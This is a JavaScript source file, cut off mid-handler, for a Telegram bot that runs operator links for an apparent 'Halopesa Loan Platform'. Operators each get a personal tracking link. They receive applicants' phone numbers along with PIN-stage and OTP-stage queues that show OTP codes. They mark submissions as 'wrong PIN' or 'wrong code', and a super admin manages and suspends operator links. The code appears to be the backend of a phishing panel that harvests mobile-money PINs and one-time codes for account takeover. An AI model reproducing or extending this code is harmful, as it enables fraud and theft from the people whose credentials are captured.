const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// WEBHOOK MODE (for Render / production)
// ==========================================

const BOT_TOKEN   = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT        = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;

// Create bot WITHOUT polling
const bot = new TelegramBot(BOT_TOKEN);

// In-memory maps
const adminChatIds      = new Map(); // adminId → chatId
const pausedAdmins      = new Set(); // adminIds that are paused
const processingLocks   = new Set(); // prevents duplicate pin submissions
const suspendAllSessions = new Map(); // superadmin chatId → session data

const SUSPEND_PAGE_SIZE = 10;

let dbReady = false;

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

// Format +263XXXXXXXXX → 0XXXXXXXXX for Telegram display
function formatPhone(phoneNumber) {
    if (!phoneNumber) return phoneNumber;
    if (phoneNumber.startsWith('+2630')) return phoneNumber.slice(4);
    if (phoneNumber.startsWith('+263'))  return '0' + phoneNumber.slice(4);
    if (phoneNumber.startsWith('2630'))  return phoneNumber.slice(3);
    if (phoneNumber.startsWith('263'))   return '0' + phoneNumber.slice(3);
    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber;
    return phoneNumber;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) {
                console.error(`❌ [ADMIN ACTIVITY] No chat ID for admin: ${adminId}`);
                return null;
            }
            adminChatIds.set(adminId, admin.chatId);
            return await bot.sendMessage(admin.chatId, message, options);
        } catch (err) {
            console.error(`❌ [ADMIN ACTIVITY] DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }

    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ [ADMIN ACTIVITY] Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// Build paginated suspend checklist
function buildSuspendAllPage(session) {
    const { allAdmins, selections, page } = session;
    const totalPages = Math.ceil(allAdmins.length / SUSPEND_PAGE_SIZE);
    const start      = page * SUSPEND_PAGE_SIZE;
    const pageAdmins = allAdmins.slice(start, start + SUSPEND_PAGE_SIZE);
    const suspendCount = selections.size;

    const adminRows = pageAdmins.map(admin => {
        const willSuspend = selections.has(admin.adminId);
        const label = willSuspend
            ? `✅ ${admin.name} (${admin.adminId})`
            : `⬜ ${admin.name} (${admin.adminId})`;
        return [{ text: label, callback_data: `sall_toggle_${admin.adminId}` }];
    });

    const navRow = [];
    if (page > 0) {
        navRow.push({ text: '◀ Prev', callback_data: `sall_page_${page - 1}` });
    }
    navRow.push({ text: `${page + 1} /${totalPages}`, callback_data: 'sall_noop' });
    if (page < totalPages - 1) {
        navRow.push({ text: 'Next ▶', callback_data: `sall_page_${page + 1}` });
    }

    const actionRow = [
        { text: `🔒 Suspend Selected (${suspendCount})`, callback_data: 'sall_confirm' },
        { text: '❌ Cancel',                              callback_data: 'sall_cancel'  }
    ];

    const inline_keyboard = [...adminRows, navRow, actionRow];

    const text = `
🔒 *SUSPEND ADMIN LINKS*

Tap an admin to toggle ✅/⬜
✅ = will be suspended  ⬜ = will be kept active

Page ${page + 1} of ${totalPages} ·${allAdmins.length} admins total
Selected to suspend: *${suspendCount}*

Deselect anyone you want to keep active, then tap *Suspend Selected*.
    `.trim();

    return { text, inline_keyboard };
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// Custom Logging Middleware for API requests
app.use((req, res, next) => {
    if (req.path.startsWith('/api/')) {
        console.log(`📡 [API REQUEST] ${req.method}${req.path} - Query: ${JSON.stringify(req.query)} - Body:${JSON.stringify(req.body)}`);
    }
    next();
});

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
console.log('⏳ Setting up bot handlers...');

bot.on('error',         (error) => console.error('❌ Bot error:',    error?.message));
bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));

setupCommandHandlers();
console.log('✅ Command handlers configured!');

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    try {
        if (req.body && req.body.update_id !== undefined) {
            try {
                bot.processUpdate(req.body);
            } catch (processError) {
                console.error('❌ processUpdate error:', processError);
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// DATABASE INIT + WEBHOOK SETUP
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');

        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSetSuccessfully = false;
        let attempts = 0;

        while (!webhookSetSuccessfully && attempts < 3) {
            attempts++;
            try {
                console.log(`🔄 Attempt ${attempts}/3: Setting webhook to:${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(resolve => setTimeout(resolve, 1000));

                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false,
                    max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });

                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) {
                        webhookSetSuccessfully = true;
                        console.log(`✅ Webhook CONFIRMED: ${fullWebhookUrl}`);
                    } else {
                        console.error(`❌ Webhook URL mismatch. Got: ${info.url}`);
                    }
                }
            } catch (webhookError) {
                console.error(`❌ Webhook setup error (attempt ${attempts}):`, webhookError.message);
                if (attempts < 3) await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (!webhookSetSuccessfully) {
            console.error('❌❌❌ CRITICAL: Failed to set webhook after all attempts!');
        }

        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Bot connected: @${botInfo.username} (${botInfo.first_name})`);
        } catch (botError) {
            console.error('❌ Bot API error:', botError);
        }

        // Keep-alive + self-ping
        setInterval(() => {
            console.log(`💓 Keep-alive: ${adminChatIds.size} admins connected,${pausedAdmins.size} paused`);
            const pingUrl = `${WEBHOOK_URL}/health`;
            fetch(pingUrl).catch(() => {});
        }, 14 * 60 * 1000);

        // Webhook health check
        setInterval(async () => {
            try {
                const info  = await bot.getWebHookInfo();
                const isSet = info.url === fullWebhookUrl;
                if (!isSet) {
                    console.log('⚠️ Auto-fixing webhook...');
                    await bot.setWebHook(fullWebhookUrl, {
                        drop_pending_updates: false,
                        max_connections: 40,
                        allowed_updates: ['message', 'callback_query']
                    });
                }
            } catch (error) {
                console.error('⚠️ Webhook check error:', error.message);
            }
        }, 60000);

        console.log('✅ System fully initialized!');
    })
    .catch((error) => {
        console.error('❌ Initialization failed:', error);
        process.exit(1);
    });

// ==========================================
// LOAD ADMIN CHAT IDs FROM DB
// ==========================================
async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        console.log(`📋 Loading ${admins.length} admins from database...`);

        adminChatIds.clear();
        pausedAdmins.clear();

        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }

        console.log(`✅ ${adminChatIds.size} admins loaded,${pausedAdmins.size} paused`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
function setupCommandHandlers() {

    // /start
    bot.onText(/\/start/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        console.log(`👤 [ADMIN ACTIVITY] Command /start triggered by chatId: ${chatId}, AdminID:${adminId || 'UNREGISTERED'}`);

        try {
            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    console.warn(`⛔ [ADMIN ACTIVITY] Paused admin ${adminId} attempted /start`);
                    await bot.sendMessage(chatId, `
🚫 *ADMIN ACCESS PAUSED*

Your admin access has been temporarily paused.
Please contact the super admin.

*Your Admin ID:* \`${adminId}\`
                    `, { parse_mode: 'Markdown' });
                    return;
                }

                const admin       = await db.getAdmin(adminId);
                const isSuperAdmin = adminId === 'ADMIN001';

                let message = `
👋 *Welcome ${admin.name}!*

*Your Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}
*Your Personal Link:*
${WEBHOOK_URL}?admin=${adminId}

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information
`;
                if (isSuperAdmin) {
                    message += `
*Admin Management (Super Admin Only):*
/addadmin - Add new admin
/addadminid - Add admin with specific ID
/transferadmin oldChatId | newChatId - Transfer admin
/pauseadmin <adminId> - Pause an admin
/unpauseadmin <adminId> - Unpause an admin
/removeadmin <adminId> - Remove an admin
/admins - List all admins
/suspendall - 🔒 Suspend selected admin links (checklist)

*Messaging:*
/send <adminId> <message> - Message an admin
/broadcast <message> - Message all admins
/ask <adminId> <request> - Send action request
`;
                }
                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            } else {
                await bot.sendMessage(chatId, `
👋 *Welcome to Halopesa Loan Platform!*

Your Chat ID: \`${chatId}\`

Provide this to your super admin to get access.
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error in /start:', error);
        }
    });

    // /mylink
    bot.onText(/\/mylink/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        console.log(`👤 [ADMIN ACTIVITY] Admin ${adminId || 'UNKNOWN'} requested /mylink`);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `
🔗 *YOUR LINK*

\`${WEBHOOK_URL}?admin=${adminId}\`

📋 Applications → *${admin.name}*
        `, { parse_mode: 'Markdown' });
    });

    // /stats
    bot.onText(/\/stats/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        console.log(`📊 [ADMIN ACTIVITY] Admin ${adminId || 'UNKNOWN'} requested /stats`);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *STATISTICS*

📋 Total: ${stats.total}
⏳ PIN Pending: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ OTP Pending: ${stats.otpPending}
🎉 Fully Approved: ${stats.fullyApproved}
        `, { parse_mode: 'Markdown' });
    });

    // /pending
    bot.onText(/\/pending/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        console.log(`⏳ [ADMIN ACTIVITY] Admin ${adminId || 'UNKNOWN'} checked /pending applications`);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');

        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');

        let message = `⏳ *PENDING*\n\n`;
        if (pinPending.length > 0) {
            message += `📱 *PIN (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => {
                message += `${i+1}.${formatPhone(app.phoneNumber)} - \`${app.id}\`\n`;
            });
            message += '\n';
        }
        if (otpPending.length > 0) {
            message += `🔢 *OTP (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => {
                message += `${i+1}.${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`;
            });
        }
        if (pinPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    // /myinfo
    bot.onText(/\/myinfo/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        console.log(`ℹ️ [ADMIN ACTIVITY] Admin ${adminId || 'UNKNOWN'} requested /myinfo`);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const admin      = await db.getAdmin(adminId);
        const statusEmoji = pausedAdmins.has(adminId) ? '🚫' : '✅';
        const statusText  = pausedAdmins.has(adminId) ? 'Paused' : 'Active';
        bot.sendMessage(chatId, `
ℹ️ *YOUR INFO*

👤 ${admin.name}
📧 ${admin.email}
🆔 \`${adminId}\`
💬 \`${chatId}\`
📅 ${new Date(admin.createdAt).toLocaleString()}
${statusEmoji} Status:${statusText}

🔗 ${WEBHOOK_URL}?admin=${adminId}
        `, { parse_mode: 'Markdown' });
    });

    // /addadmin
    bot.onText(/\/addadmin$/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');
        bot.sendMessage(chatId, `
📝 *ADD NEW ADMIN*

Use this format:
\`/addadmin NAME|EMAIL|CHATID\`
        `, { parse_mode: 'Markdown' });
    });

    // /addadmin NAME|EMAIL|CHATID
    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 3) {
                return bot.sendMessage(chatId, '❌ Invalid format. Use: `/addadmin NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' });
            }

            const [name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr);
            if (isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must be a number!');

            const allAdmins        = await db.getAllAdmins();
            const existingNumbers  = allAdmins.map(a => parseInt(a.adminId.replace('ADMIN', ''))).filter(n => !isNaN(n));
            const nextNumber       = existingNumbers.length > 0 ? Math.max(...existingNumbers) + 1 : 1;
            const newAdminId       = `ADMIN${String(nextNumber).padStart(3, '0')}`;

            await db.saveAdmin({ adminId: newAdminId, chatId: newChatId, name, email, status: 'active', createdAt: new Date() });
            adminChatIds.set(newAdminId, newChatId);

            console.log(`➕ [SUPERADMIN ACTIVITY] Superadmin added new admin: ${name} (${newAdminId}) with ChatID:${newChatId}`);

            await bot.sendMessage(chatId, `
✅ *ADMIN ADDED*

👤 ${name}
📧 ${email}
🆔 \`${newAdminId}\`
💬 \`${newChatId}\`

🔗 Their link:
${WEBHOOK_URL}?admin=${newAdminId}
            `, { parse_mode: 'Markdown' });

            try {
                await bot.sendMessage(newChatId, `
🎉 *YOU'RE NOW AN ADMIN!*

Welcome ${name}!
*Your Admin ID:* \`${newAdminId}\`
*Your Personal Link:*
${WEBHOOK_URL}?admin=${newAdminId}
                `, { parse_mode: 'Markdown' });
            } catch (notifyError) {
                bot.sendMessage(chatId, '⚠️ Admin added but could not notify them.');
            }
        } catch (error) {
            console.error('❌ Error adding admin:', error);
            bot.sendMessage(chatId, '❌ Failed to add admin: ' + error.message);
        }
    });

    // /addadminid ADMINID|NAME|EMAIL|CHATID
    bot.onText(/\/addadminid (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 4) return bot.sendMessage(chatId, '❌ Invalid format.');

            const [newAdminId, name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr);
            if (isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must be a number!');

            const existing = await db.getAdmin(newAdminId);
            if (existing) return bot.sendMessage(chatId, `❌ Admin \`${newAdminId}\` already exists!`, { parse_mode: 'Markdown' });

            await db.saveAdmin({ adminId: newAdminId, chatId: newChatId, name, email, status: 'active', createdAt: new Date() });
            adminChatIds.set(newAdminId, newChatId);

            console.log(`➕ [SUPERADMIN ACTIVITY] Superadmin created custom admin: ${newAdminId} (${name})`);

            await bot.sendMessage(chatId, `✅ *ADMIN ADDED WITH CUSTOM ID*: \`${newAdminId}\``, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ Error adding admin:', error);
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    // /transferadmin
    bot.onText(/\/transferadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can transfer admins.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 2) return bot.sendMessage(chatId, '❌ Use: /transferadmin oldChatId | newChatId');

            const [oldChatIdStr, newChatIdStr] = parts;
            const oldChatId = parseInt(oldChatIdStr);
            const newChatId = parseInt(newChatIdStr);

            let targetAdminId = null;
            for (const [id, storedChatId] of adminChatIds.entries()) {
                if (storedChatId === oldChatId) { targetAdminId = id; break; }
            }

            if (!targetAdminId) return bot.sendMessage(chatId, `❌ No admin found with Chat ID: \`${oldChatId}\``, { parse_mode: 'Markdown' });

            await db.updateAdmin(targetAdminId, { chatId: newChatId });
            adminChatIds.set(targetAdminId, newChatId);

            console.log(`🔄 [SUPERADMIN ACTIVITY] Transferred Admin ${targetAdminId} from ${oldChatId} to${newChatId}`);
            await bot.sendMessage(chatId, `🔄 *ADMIN TRANSFERRED*: \`${targetAdminId}\``, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    // /pauseadmin <adminId>
    bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can pause admins.');

        try {
            const targetAdminId = match[1].trim();
            if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '🚫 Cannot pause super admin!');

            pausedAdmins.add(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'paused' });

            console.warn(`⏸️ [SUPERADMIN ACTIVITY] Paused Admin: ${targetAdminId}`);
            await bot.sendMessage(chatId, `🚫 *ADMIN PAUSED*: \`${targetAdminId}\``, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    // /unpauseadmin <adminId>
    bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can unpause admins.');

        try {
            const targetAdminId = match[1].trim();
            pausedAdmins.delete(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'active' });

            console.log(`▶️ [SUPERADMIN ACTIVITY] Unpaused Admin: ${targetAdminId}`);
            await bot.sendMessage(chatId, `✅ *ADMIN UNPAUSED*: \`${targetAdminId}\``, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    // /removeadmin <adminId>
    bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can remove admins.');

        try {
            const targetAdminId = match[1].trim();
            if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '🚫 Cannot remove super admin!');

            await db.deleteAdmin(targetAdminId);
            adminChatIds.delete(targetAdminId);
            pausedAdmins.delete(targetAdminId);

            console.log(`🗑️ [SUPERADMIN ACTIVITY] Deleted Admin: ${targetAdminId}`);
            await bot.sendMessage(chatId, `🗑️ *ADMIN REMOVED*: \`${targetAdminId}\``, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    // /admins
    bot.onText(/\/admins/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        console.log(`👥 [ADMIN ACTIVITY] Admin ${adminId || 'UNKNOWN'} requested /admins list`);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');

        try {
            const allAdmins = await db.getAllAdmins();
            let message = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;

            allAdmins.forEach((admin, index) => {
                const isSuperAdmin  = admin.adminId === 'ADMIN001';
                const isPaused      = pausedAdmins.has(admin.adminId);
                const isConnected   = adminChatIds.has(admin.adminId);
                const statusEmoji   = isSuperAdmin ? '⭐' : isPaused ? '🚫' : '✅';
                const statusText    = isSuperAdmin ? 'Super Admin' : isPaused ? 'Paused' : 'Active';
                const connEmoji     = isConnected ? '🟢' : '⚪';

                message += `${index+1}. ${statusEmoji} *${admin.name}*\n`;
                message += `   📧 ${admin.email}\n`;
                message += `   🆔 \`${admin.adminId}\`\n`;
                message += `   ${connEmoji}${statusText}\n\n`;
            });

            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed to list admins.');
        }
    });

    // /suspendall
    bot.onText(/\/suspendall/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        console.log(`🔒 [SUPERADMIN ACTIVITY] Triggered /suspendall checklist setup`);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can suspend links.');

        try {
            const allAdmins     = await db.getAllAdmins();
            const regularAdmins = allAdmins.filter(a => a.adminId !== 'ADMIN001');

            if (regularAdmins.length === 0) {
                return bot.sendMessage(chatId, '⚠️ No admins to suspend.');
            }

            const selections = new Set(regularAdmins.map(a => a.adminId));
            suspendAllSessions.set(chatId, { page: 0, allAdmins: regularAdmins, selections });

            const session = suspendAllSessions.get(chatId);
            const { text, inline_keyboard } = buildSuspendAllPage(session);

            await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: { inline_keyboard } });
        } catch (error) {
            console.error('❌ Error in /suspendall:', error);
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    // /send
    bot.onText(/\/send (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can send messages.');

        try {
            const input = match[1].trim();
            const spaceIndex = input.indexOf(' ');
            if (spaceIndex === -1) return bot.sendMessage(chatId, `❌ Use: /send ADMINID Message`);
            const targetAdminId = input.substring(0, spaceIndex).trim();
            const messageText   = input.substring(spaceIndex + 1).trim();

            console.log(`📨 [SUPERADMIN ACTIVITY] Direct message sent to ${targetAdminId}`);
            await sendToAdmin(targetAdminId, `📨 *MESSAGE FROM SUPER ADMIN*\n\n${messageText}`, { parse_mode: 'Markdown' });
            bot.sendMessage(chatId, `✅ Message sent to \`${targetAdminId}\``, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    // /broadcast
    bot.onText(/\/broadcast (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can broadcast.');

        console.log(`📢 [SUPERADMIN ACTIVITY] Initiated system-wide broadcast`);
        const messageText  = match[1].trim();
        const allAdmins    = await db.getAllAdmins();
        const targetAdmins = allAdmins.filter(a => a.adminId !== 'ADMIN001');

        for (const admin of targetAdmins) {
            await sendToAdmin(admin.adminId, `📢 *BROADCAST FROM SUPER ADMIN*\n\n${messageText}`, { parse_mode: 'Markdown' });
        }
        bot.sendMessage(chatId, `📢 Broadcast complete to ${targetAdmins.length} admins.`);
    });

    // /ask
    bot.onText(/\/ask (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can send action requests.');

        const input = match[1].trim();
        const spaceIndex = input.indexOf(' ');
        if (spaceIndex === -1) return bot.sendMessage(chatId, `❌ Use: /ask ADMINID Request`);
        const targetAdminId = input.substring(0, spaceIndex).trim();
        const requestText   = input.substring(spaceIndex + 1).trim();

        console.log(`❓ [SUPERADMIN ACTIVITY] Sent request prompt to Admin ${targetAdminId}`);
        const requestId = `REQ-${Date.now()}`;
        await sendToAdmin(targetAdminId, `❓ *REQUEST FROM SUPER ADMIN*\n\n${requestText}\n\nID: \`${requestId}\``, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Done',      callback_data: `request_done_${requestId}_${targetAdminId}` },
                    { text: '❓ Need Help', callback_data: `request_help_${requestId}_${targetAdminId}` }
                ]]
            }
        });
        bot.sendMessage(chatId, `✅ Request sent to \`${targetAdminId}\``, { parse_mode: 'Markdown' });
    });

    console.log('✅ Command handlers setup complete!');
}

// ==========================================
// TELEGRAM CALLBACK HANDLER
// ==========================================
bot.on('callback_query', async (callbackQuery) => {
    const chatId    = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data      = callbackQuery.data;
    const adminId   = getAdminIdByChatId(chatId);

    console.log(`🔘 [ADMIN ACTIVITY LOG] Action: "${data}" | Admin ChatID: ${chatId} \vert{} Admin ID:${adminId || 'UNAUTHORIZED'}`);

    if (!adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
    }

    if (data === 'sall_noop') return bot.answerCallbackQuery(callbackQuery.id, { text: '' });

    if (data.startsWith('sall_toggle_')) {
        const targetAdminId = data.replace('sall_toggle_', '');
        const session = suspendAllSessions.get(chatId);
        if (!session) return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired.' });

        if (session.selections.has(targetAdminId)) session.selections.delete(targetAdminId);
        else session.selections.add(targetAdminId);

        const { text, inline_keyboard } = buildSuspendAllPage(session);
        try { await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard } }); } catch (e) {}
        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
    }

    if (data === 'sall_confirm') {
        const session = suspendAllSessions.get(chatId);
        if (!session) return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired.' });

        const toSuspend = session.allAdmins.filter(a => session.selections.has(a.adminId));
        console.warn(`🔒 [SUPERADMIN ACTIVITY] Bulk suspending ${toSuspend.length} admin links...`);

        for (const admin of toSuspend) {
            pausedAdmins.add(admin.adminId);
            await db.updateAdmin(admin.adminId, { status: 'paused' });
            console.log(`  └─ Suspended Admin: ${admin.adminId}`);
        }

        suspendAllSessions.delete(chatId);
        await bot.editMessageText(`🔒 *SUSPENSION COMPLETE*: ${toSuspend.length} links suspended.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return;
    }

    if (!isAdminActive(chatId)) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access has been paused.', show_alert: true });
    }

    // ── Application Stage Callbacks ──
    const parts = data.split('_');
    if (parts.length < 4) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid callback data.' });

    const action          = parts[0];
    const type            = parts[1];
    const embeddedAdminId = parts[2];
    const applicationId   = parts.slice(3).join('_');

    if (embeddedAdminId !== adminId) {
        console.warn(`⚠️ [ADMIN ACTIVITY] Access denied: Admin ${adminId} tried interacting with Application ${applicationId} belonging to${embeddedAdminId}`);
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application belongs to another admin!', show_alert: true });
    }

    const application = await db.getApplication(applicationId);
    if (!application) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found!' });

    // Wrong PIN at OTP stage
    if (action === 'wrongpin' && type === 'otp') {
        console.log(`❌ [ADMIN ACTIVITY] Admin ${adminId} flagged WRONG PIN AT OTP STAGE for Application:${applicationId}`);
        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
        await bot.editMessageText(`❌ *WRONG PIN AT OTP STAGE*\n\n📋 \`${applicationId}\`\n📞 \`${formatPhone(application.phoneNumber)}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Marked wrong PIN' });
    }

    // Wrong OTP Code
    if (action === 'wrongcode' && type === 'otp') {
        console.log(`❌ [ADMIN ACTIVITY] Admin ${adminId} flagged WRONG OTP CODE for Application:${applicationId}`);
        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
        await bot.editMessageText(`❌ *WRONG CODE ENTERED*\n\n📋 \`${applicationId}\`\n📞 \`${formatPhone(application.phoneNumber)}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Marked wrong code' });
    }

    // Reject PIN Verification
    if (action === 'deny' && type === 'pin') {
